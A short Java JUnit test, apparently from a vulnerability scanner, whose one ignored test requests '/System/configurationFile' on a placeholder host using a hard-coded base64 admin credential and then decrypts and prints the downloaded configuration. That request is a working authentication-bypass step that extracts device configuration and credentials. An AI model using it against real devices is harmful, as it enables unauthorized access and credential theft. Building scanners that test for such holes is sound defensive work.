import okhttp3.Response;
import org.junit.Ignore;
import org.junit.Test;
import scanner.cve.ConfigurationDecrypt;
import scanner.http.HttpClient;

import java.io.InputStream;

public class ConfigurationDecryptTest {

    @Test
    @Ignore
    public void testDecrypt() {
        Response response = HttpClient.execute("http://host/System/configurationFile?auth=YWRtaW46MTEK");
        InputStream inputStream = response.body().byteStream();
        System.out.println(ConfigurationDecrypt.decrypt(inputStream));
    }

}